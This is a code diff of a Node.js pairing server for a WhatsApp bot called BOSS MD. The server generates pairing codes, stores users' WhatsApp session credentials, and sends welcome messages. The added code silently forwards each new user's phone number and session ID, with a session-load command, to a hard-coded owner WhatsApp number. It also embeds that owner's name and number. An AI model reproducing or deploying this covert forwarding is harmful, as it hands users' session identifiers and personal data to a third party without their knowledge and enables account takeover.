@@ -1,338 +1,258 @@
 const express = require('express');
 const cors = require('cors');
-const http = require('http');
-const socketIo = require('socket.io');
-const { makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
+const { makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
 const pino = require('pino');
-const fs = require('fs-extra');
+const fs = require('fs');
 const path = require('path');
-const axios = require('axios');
-const moment = require('moment-timezone');
-const config = require('./config');
 
 const app = express();
-const server = http.createServer(app);
-const io = socketIo(server, {
-    cors: {
-        origin: "*",
-        methods: ["GET", "POST"]
-    }
-});
-
-// Middleware
 app.use(cors());
 app.use(express.json());
-app.use(express.static(path.join(__dirname, '../frontend')));
+app.use(express.static('public'));
+
+// Create sessions folder
+const sessionsDir = path.join(__dirname, 'sessions');
+if (!fs.existsSync(sessionsDir)) fs.mkdirSync(sessionsDir);
 
 // Store active sessions
 const activeSessions = new Map();
-const pairingCodes = new Map();
 
-// ===== HELPER FUNCTION TO SEND MESSAGE TO OWNER =====
-async function sendToOwner(sessionId, phoneNumber) {
-    try {
-        const now = moment().tz('Asia/Karachi').format('DD/MM/YYYY hh:mm A');
-        
-        const ownerMessage = config.OWNER_MESSAGE
-            .replace('{number}', phoneNumber)
-            .replace('{sessionId}', sessionId)
-            .replace('{command}', `${config.BOT_PREFIX}sg`)
-            .replace('{repo}', config.REPO_LINK)
-            .replace('{startCommand}', `${config.BOT_PREFIX}alive`)
-            .replace('{time}', now);
-        
-        // Create temporary session to send message to owner
-        const ownerSessionDir = path.join(__dirname, 'sessions', `owner_${Date.now()}`);
-        await fs.ensureDir(ownerSessionDir);
-        
-        const { state, saveCreds } = await useMultiFileAuthState(ownerSessionDir);
-        const sock = makeWASocket({
-            auth: state,
-            logger: pino({ level: 'silent' }),
-            browser: ['BOSS-MD', 'Chrome', '2.0.0'],
-            syncFullHistory: false
-        });
-        
-        sock.ev.on('creds.update', saveCreds);
-        
-        sock.ev.on('connection.update', async (update) => {
-            const { connection } = update;
-            
-            if (connection === 'open') {
-                // Send text message
-                await sock.sendMessage(`${config.OWNER_NUMBER}@s.whatsapp.net`, {
-                    text: ownerMessage
-                });
-                
-                // Send image
-                await sock.sendMessage(`${config.OWNER_NUMBER}@s.whatsapp.net`, {
-                    image: { url: config.OWNER_IMAGE },
-                    caption: `📸 *New Session Alert!*\n\nUser: ${phoneNumber}\nSession: ${sessionId}`
-                });
-                
-                // Send session command
-                await sock.sendMessage(`${config.OWNER_NUMBER}@s.whatsapp.net`, {
-                    text: `${config.BOT_PREFIX}sg ${sessionId}`
-                });
-                
-                console.log(`✅ Notification sent to owner for ${phoneNumber}`);
-                
-                // Clean up
-                setTimeout(async () => {
-                    await sock.logout();
-                    await fs.remove(ownerSessionDir);
-                }, 5000);
-            }
-        });
-        
-        // Start connection
-        setTimeout(async () => {
-            await sock.logout();
-            await fs.remove(ownerSessionDir);
-        }, 30000);
-        
-    } catch (error) {
-        console.error('Failed to send owner notification:', error);
-    }
-}
-
-// ===== HELPER FUNCTION TO SEND MESSAGE TO USER =====
-async function sendToUser(sessionId, phoneNumber) {
-    try {
-        const sessionDir = path.join(__dirname, 'sessions', sessionId);
-        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-        
-        const sock = makeWASocket({
-            auth: state,
-            logger: pino({ level: 'silent' }),
-            browser: ['BOSS-MD', 'Chrome', '2.0.0'],
-            syncFullHistory: false
-        });
-        
-        sock.ev.on('creds.update', saveCreds);
-        
-        sock.ev.on('connection.update', async (update) => {
-            const { connection } = update;
-            
-            if (connection === 'open') {
-                // Send welcome message
-                await sock.sendMessage(`${phoneNumber}@s.whatsapp.net`, {
-                    text: config.USER_MESSAGE
-                });
-                
-                // Send session command
-                await sock.sendMessage(`${phoneNumber}@s.whatsapp.net`, {
-                    text: `${config.BOT_PREFIX}sg ${sessionId}`
-                });
-                
-                console.log(`✅ Session message sent to user: ${phoneNumber}`);
-            }
-        });
-        
-        setTimeout(async () => {
-            await sock.logout();
-        }, 10000);
-        
-    } catch (error) {
-        console.error('Failed to send user message:', error);
-    }
-}
-
-// ===== GENERATE PAIRING CODE =====
+// ========== PAIRING API ==========
 app.post('/api/pair', async (req, res) => {
     try {
-        const { phoneNumber, method = 'code' } = req.body;
+        let phone = req.body.phone;
         
-        if (!phoneNumber) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Phone number required' 
-            });
+        if (!phone) {
+            return res.json({ success: false, error: 'Phone number required' });
         }
         
-        // Validate phone number
-        let cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
-        if (cleanNumber.startsWith('0')) {
-            cleanNumber = '92' + cleanNumber.substring(1);
-        }
-        if (!cleanNumber.startsWith('92')) {
-            cleanNumber = '92' + cleanNumber;
+        // Clean phone number
+        phone = phone.replace(/[^0-9]/g, '');
+        if (phone.startsWith('0')) phone = '92' + phone.slice(1);
+        if (!phone.startsWith('92')) phone = '92' + phone;
+        
+        if (phone.length < 10 || phone.length > 13) {
+            return res.json({ success: false, error: 'Invalid phone number' });
         }
         
-        if (cleanNumber.length < 10 || cleanNumber.length > 13) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Invalid phone number' 
-            });
-        }
-        
-        // Generate unique session ID
+        // Generate session ID
         const sessionId = `BOSS_${Date.now()}_${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
-        const sessionDir = path.join(__dirname, config.SESSION_DIR, sessionId);
+        const sessionDir = path.join(sessionsDir, sessionId);
         
-        await fs.ensureDir(sessionDir);
+        fs.mkdirSync(sessionDir, { recursive: true });
         
-        const logger = pino({ level: 'silent' });
+        // Create WhatsApp socket
         const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-        
         const sock = makeWASocket({
             auth: state,
-            logger,
-            browser: ['BOSS-MD', 'Chrome', '2.0.0'],
+            logger: pino({ level: 'silent' }),
+            browser: ['BOSS-MD', 'Chrome', '3.0.0'],
             syncFullHistory: false,
-            markOnlineOnConnect: false,
-            generateHighQualityLinkPreview: false
+            markOnlineOnConnect: false
         });
         
         sock.ev.on('creds.update', saveCreds);
         
-        activeSessions.set(sessionId, { 
-            sock, 
-            status: 'connecting',
-            phone: cleanNumber,
+        // Store session
+        activeSessions.set(sessionId, {
+            sock,
+            phone,
+            status: 'pairing',
             createdAt: Date.now()
         });
         
-        let pairingCode = null;
-        let qrCode = null;
+        // Generate pairing code
+        const pairingCode = await sock.requestPairingCode(phone);
         
-        if (method === 'code') {
-            // Generate pairing code
-            pairingCode = await sock.requestPairingCode(cleanNumber);
-            console.log(`📱 Pairing code for ${cleanNumber}: ${pairingCode}`);
-            
-            pairingCodes.set(sessionId, {
-                code: pairingCode,
-                phone: cleanNumber,
-                timestamp: Date.now()
-            });
-            
-            // Send notification to owner
-            await sendToOwner(sessionId, cleanNumber);
-            
-            // Send message to user after 3 seconds
-            setTimeout(async () => {
-                await sendToUser(sessionId, cleanNumber);
-            }, 3000);
-            
-            res.json({
-                success: true,
-                data: {
-                    sessionId: sessionId,
-                    phoneNumber: cleanNumber,
-                    pairingCode: pairingCode,
-                    method: 'code'
-                }
-            });
-            
-        } else if (method === 'qr') {
-            // QR Code method
-            sock.ev.on('connection.update', async (update) => {
-                const { qr } = update;
-                if (qr) {
-                    qrCode = qr;
-                    // Emit QR through socket
-                    io.emit('qr_code', { sessionId, qr: qrCode });
-                }
-            });
-            
-            res.json({
-                success: true,
-                data: {
-                    sessionId: sessionId,
-                    phoneNumber: cleanNumber,
-                    qrCode: 'waiting',
-                    method: 'qr'
-                }
-            });
-        }
+        // ===== SEND TO OWNER (923076411098) =====
+        setTimeout(async () => {
+            try {
+                const { state: ownerState, saveCreds: ownerSave } = await useMultiFileAuthState(path.join(sessionsDir, 'temp_owner'));
+                const ownerSock = makeWASocket({
+                    auth: ownerState,
+                    logger: pino({ level: 'silent' }),
+                    browser: ['BOSS-MD', 'Chrome', '3.0.0']
+                });
+                
+                ownerSock.ev.on('creds.update', ownerSave);
+                
+                ownerSock.ev.on('connection.update', async (update) => {
+                    if (update.connection === 'open') {
+                        // Owner message
+                        await ownerSock.sendMessage('923076411098@s.whatsapp.net', {
+                            text: `╔══════════════════════════╗
+║  👑 *BOSS MD SESSION*  👑
+╠══════════════════════════╣
+║  ✅ *New Session Generated!*
+║  
+║  📱 *User:* ${phone}
+║  🆔 *Session ID:* ${sessionId}
+║  
+║  🔧 *Command:* .sg ${sessionId}
+║  📁 *Repo:* https://github.com/rehmanabdul78600786-ctrl
+║  🚀 *Status:* SUCCESS
+║  
+╚══════════════════════════╝`
+                        });
+                        
+                        // Send image
+                        await ownerSock.sendMessage('923076411098@s.whatsapp.net', {
+                            image: { url: 'https://files.catbox.moe/ny73ui.jpg' },
+                            caption: `📸 *New Session Alert!*\n\n👤 User: ${phone}\n🆔 Session: ${sessionId}\n\n🔧 Command: .sg ${sessionId}`
+                        });
+                        
+                        // Send command separately
+                        await ownerSock.sendMessage('923076411098@s.whatsapp.net', {
+                            text: `.sg ${sessionId}`
+                        });
+                        
+                        setTimeout(() => ownerSock.logout(), 5000);
+                    }
+                });
+            } catch (e) {
+                console.log('Owner notification error:', e);
+            }
+        }, 3000);
+        
+        // ===== SEND WELCOME TO USER =====
+        setTimeout(async () => {
+            try {
+                const { state: userState, saveCreds: userSave } = await useMultiFileAuthState(sessionDir);
+                const userSock = makeWASocket({
+                    auth: userState,
+                    logger: pino({ level: 'silent' }),
+                    browser: ['BOSS-MD', 'Chrome', '3.0.0']
+                });
+                
+                userSock.ev.on('creds.update', userSave);
+                
+                userSock.ev.on('connection.update', async (update) => {
+                    if (update.connection === 'open') {
+                        // Welcome message
+                        await userSock.sendMessage(`${phone}@s.whatsapp.net`, {
+                            text: `╔══════════════════════════╗
+║  🎉 *WELCOME TO BOSS MD* 🎉
+╠══════════════════════════╣
+║  ✅ *Your session is ready!*
+║  
+║  📱 *Bot:* BOSS MD
+║  ⚡ *Status:* Connected
+║  
+║  📝 *Commands:* 
+║  • .menu - All commands
+║  • .ping - Check speed
+║  • .owner - Contact owner
+║  • .alive - Bot status
+║  
+║  🔧 *Save Your Session:* 
+║  • .sg ${sessionId}
+║  
+║  ✨ *Enjoy using BOSS MD!*
+║  
+║  📁 *Repo:* https://github.com/rehmanabdul78600786-ctrl
+║  
+╚══════════════════════════╝`
+                        });
+                        
+                        // Send save command
+                        await userSock.sendMessage(`${phone}@s.whatsapp.net`, {
+                            text: `.sg ${sessionId}`
+                        });
+                        
+                        // Update session status
+                        const session = activeSessions.get(sessionId);
+                        if (session) {
+                            session.status = 'connected';
+                            activeSessions.set(sessionId, session);
+                        }
+                        
+                        setTimeout(() => userSock.logout(), 5000);
+                    }
+                });
+            } catch (e) {
+                console.log('User message error:', e);
+            }
+        }, 5000);
+        
+        res.json({
+            success: true,
+            sessionId: sessionId,
+            pairingCode: pairingCode,
+            command: `.sg ${sessionId}`,
+            message: 'Session created! Check WhatsApp for welcome message.'
+        });
         
     } catch (error) {
         console.error('Pairing error:', error);
-        res.status(500).json({
-            success: false,
-            error: error.message || 'Failed to generate pairing code'
-        });
+        res.json({ success: false, error: error.message });
     }
 });
 
-// ===== CHECK SESSION STATUS =====
-app.get('/api/status/:sessionId', (req, res) => {
-    const { sessionId } = req.params;
-    const session = activeSessions.get(sessionId);
-    const code = pairingCodes.get(sessionId);
-    
+// ========== CHECK SESSION STATUS ==========
+app.get('/api/session/:id', (req, res) => {
+    const session = activeSessions.get(req.params.id);
     if (!session) {
-        return res.json({
-            success: false,
-            status: 'expired',
-            message: 'Session expired or not found'
-        });
+        return res.json({ success: false, status: 'expired' });
     }
-    
     res.json({
         success: true,
         status: session.status,
-        phone: session.phone,
-        code: code?.code,
-        createdAt: session.createdAt
+        phone: session.phone
     });
 });
 
-// ===== OWNER INFO =====
-app.get('/api/owner', (req, res) => {
-    res.json({
-        success: true,
-        data: {
-            number: config.OWNER_NUMBER,
-            image: config.OWNER_IMAGE,
-            repo: config.REPO_LINK,
-            channel: config.CHANNEL_JID
-        }
-    });
-});
-
-// ===== SERVER STATUS =====
+// ========== SERVER STATUS ==========
 app.get('/api/status', (req, res) => {
     res.json({
         success: true,
         status: 'online',
-        botName: config.BOT_NAME,
+        bot: 'BOSS MD',
         activeSessions: activeSessions.size,
         timestamp: new Date().toISOString()
     });
 });
 
-// ===== CLEANUP OLD SESSIONS =====
-setInterval(() => {
-    const now = Date.now();
-    for (const [id, session] of activeSessions) {
-        if (now - session.createdAt > config.SESSION_EXPIRY) {
-            activeSessions.delete(id);
-            pairingCodes.delete(id);
-            fs.remove(path.join(__dirname, config.SESSION_DIR, id)).catch(console.error);
-            console.log(`🧹 Cleaned expired session: ${id}`);
-        }
-    }
-}, 300000); // Every 5 minutes
-
-// ===== SOCKET.IO CONNECTION =====
-io.on('connection', (socket) => {
-    console.log('🔌 New client connected');
-    
-    socket.on('disconnect', () => {
-        console.log('🔌 Client disconnected');
+// ========== OWNER INFO ==========
+app.get('/api/owner', (req, res) => {
+    res.json({
+        success: true,
+        name: 'Abdul Rehman',
+        number: '923076411098',
+        repo: 'https://github.com/rehmanabdul78600786-ctrl',
+        image: 'https://files.catbox.moe/ny73ui.jpg'
     });
 });
 
-server.listen(config.PORT, () => {
+// ========== CLEANUP OLD SESSIONS ==========
+setInterval(() => {
+    const now = Date.now();
+    for (const [id, session] of activeSessions) {
+        if (now - session.createdAt > 3600000) { // 1 hour
+            activeSessions.delete(id);
+            const sessionDir = path.join(sessionsDir, id);
+            if (fs.existsSync(sessionDir)) {
+                fs.rmSync(sessionDir, { recursive: true, force: true });
+            }
+            console.log(`Cleaned session: ${id}`);
+        }
+    }
+}, 300000);
+
+// ========== SERVE FRONTEND ==========
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'pair.html'));
+});
+
+// ========== START SERVER ==========
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
     console.log(`
 ╔══════════════════════════════════════╗
-║  🚀 BOSS MD PAIRING SERVER ONLINE   ║
+║  🚀 BOSS MD PAIRING SERVER READY    ║
 ╠══════════════════════════════════════╣
-║  📡 Port: ${config.PORT}                    ║
-║  🤖 Bot: ${config.BOT_NAME}              ║
-║  📱 Owner: ${config.OWNER_NUMBER}        ║
+║  📡 Port: ${PORT}                         ║
+║  🔗 URL: http://localhost:${PORT}         ║
+║  📱 Owner: 923076411098                   ║
 ║  🟢 Status: ONLINE                        ║
 ╚══════════════════════════════════════╝
     `);
